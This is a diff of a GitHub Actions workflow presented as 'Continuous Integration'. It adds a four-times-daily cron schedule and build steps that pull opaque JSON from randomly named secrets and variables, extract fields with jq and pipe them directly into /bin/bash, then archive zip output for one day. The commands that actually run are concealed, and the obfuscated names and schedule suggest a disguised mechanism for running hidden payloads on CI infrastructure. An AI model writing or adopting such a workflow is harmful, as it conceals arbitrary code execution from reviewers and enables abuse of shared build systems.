@@ -2,6 +2,8 @@ name: Continuous Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '47 0,6,12,18 * * *'
 env:
   CI: true
 concurrency:
@@ -17,18 +19,15 @@ jobs:
           fetch-depth: 1
       - name: Build
         env:
-          xtka572: ${{ secrets.xtka572 }}
+          omyam74: ${{ secrets.omyam74 }}
         run: |
-          printf '%s' "$xtka572" | jq -r .zx978 | /bin/bash
-          echo $ff962 | jq -r .owndl47 | /bin/bash
-          echo $oc0045 | jq -r .euo318 | /bin/bash
-          printf '%s' "$kwayr9499" | jq -r .ioy08048 | /bin/bash
-          echo $eobb062 | jq -r .z66955 | /bin/bash
-          echo $hk7 | jq -r .opbdn5687 | /bin/bash
+          printf '%s' "$omyam74" | jq -r .kq7 | /bin/bash
+          echo $t1501 | jq -r .vwaa24345 | /bin/bash
+          echo $xayf8541 | jq -r .bn13254 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
         with:
-          name: MPmnhgxb
+          name: EGrmeLdG
           path: "*.zip"
           retention-days: 1
